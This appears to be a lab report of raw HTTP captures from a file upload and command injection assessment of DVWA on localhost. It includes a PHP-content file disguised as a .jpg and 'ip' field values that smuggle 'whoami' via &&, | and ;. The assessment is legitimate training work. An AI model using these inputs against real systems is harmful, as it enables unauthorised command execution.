@@ -1,0 +1,136 @@
+================================================================
+DVWA — RAW REQUEST/RESPONSE CAPTURES
+Lab 02 — File Upload and Command Execution Security Assessment
+Target: http://127.0.0.1:42001/
+================================================================
+
+
+----------------------------------------------------------------
+[1] BASELINE UPLOAD — Security: Low
+----------------------------------------------------------------
+POST /vulnerabilities/upload/ HTTP/1.1
+Host: 127.0.0.1:42001
+Content-Type: multipart/form-data; boundary=----geckoformboundaryc36709cef15ba740c012b73bd2d1be3e
+Content-Length: 488
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+------geckoformboundaryc36709cef15ba740c012b73bd2d1be3e
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+...
+[file field: marker1.txt]
+
+Response (rendered):
+../../hackable/uploads/marker1.txt succesfully uploaded!
+
+Observation: Plain .txt file accepted with no type restriction, despite the
+form requesting an image.
+
+
+----------------------------------------------------------------
+[2] MISMATCH UPLOAD — Security: Low
+----------------------------------------------------------------
+POST /vulnerabilities/upload/ HTTP/1.1
+Host: 127.0.0.1:42001
+Content-Type: multipart/form-data; boundary=----geckoformboundarydf6517fcada6391f3b1e25dec4a78849
+Content-Length: 508
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+[file field: marker3_mismatch.jpg — content: '<?php echo "ICDFA-LAB02-MISMATCH-MARKER"; ?>']
+
+Response (rendered):
+../../hackable/uploads/marker3_mismatch.jpg succesfully uploaded!
+
+Observation: File with PHP-script content and .jpg extension accepted with
+no content/magic-byte validation.
+
+
+----------------------------------------------------------------
+[3] STORAGE / WEB-ACCESSIBILITY CHECK
+----------------------------------------------------------------
+Request:
+GET /hackable/uploads/marker3_mismatch.jpg HTTP/1.1
+Host: 127.0.0.1:42001
+
+Response:
+HTTP/1.1 200 OK
+
+Observation: Uploaded file is directly retrievable from inside the web
+root — no execution-path segregation.
+
+
+----------------------------------------------------------------
+[4] COMMAND INJECTION BASELINE — Security: Low
+----------------------------------------------------------------
+POST /vulnerabilities/exec/ HTTP/1.1
+Host: 127.0.0.1:42001
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+ip=127.0.0.1&Submit=Submit
+
+Response (rendered):
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.187 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.078 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.054 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.118 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3064ms
+rtt min/avg/max/mdev = 0.054/0.109/0.187/0.050 ms
+
+
+----------------------------------------------------------------
+[5] MINIMAL EXECUTION PROOF — Security: Low
+----------------------------------------------------------------
+POST /vulnerabilities/exec/ HTTP/1.1
+Host: 127.0.0.1:42001
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+ip=127.0.0.1+%26%26+whoami&Submit=Submit
+
+Response (rendered):
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.119 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.088 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.061 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.040 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3058ms
+rtt min/avg/max/mdev = 0.040/0.077/0.119/0.029 ms
+_dvwa
+
+Observation: Injected 'whoami' command executed; output '_dvwa' confirms
+the application runs as system user '_dvwa'. The 'ip' parameter is
+concatenated directly into a shell command with no sanitisation of shell
+metacharacters.
+
+
+----------------------------------------------------------------
+[6] SECURE MODE RETEST — Security: High
+----------------------------------------------------------------
+Upload retest (marker3_mismatch.jpg):
+Response (rendered):
+Your image was not uploaded. We can only accept JPEG or PNG images.
+
+Command injection retest — three separator variants tested:
+POST /vulnerabilities/exec/ HTTP/1.1
+Host: 127.0.0.1:42001
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Cookie: security=high; PHPSESSID=12f521fcc7c7e73a78d0b2dbf8eece7e
+
+ip=127.0.0.1%3Bwhoami&Submit=Submit
+
+Payloads tested:
+  a) 127.0.0.1 && whoami
+  b) 127.0.0.1 | whoami
+  c) 127.0.0.1;whoami
+
+Result for all three: no ping output, no command output returned.
+
+Observation: DVWA's High security level filters/strips common shell
+metacharacters (&&, |, ;) server-side before the ping command is built.
+No bypass was found within the tested, non-destructive scope.
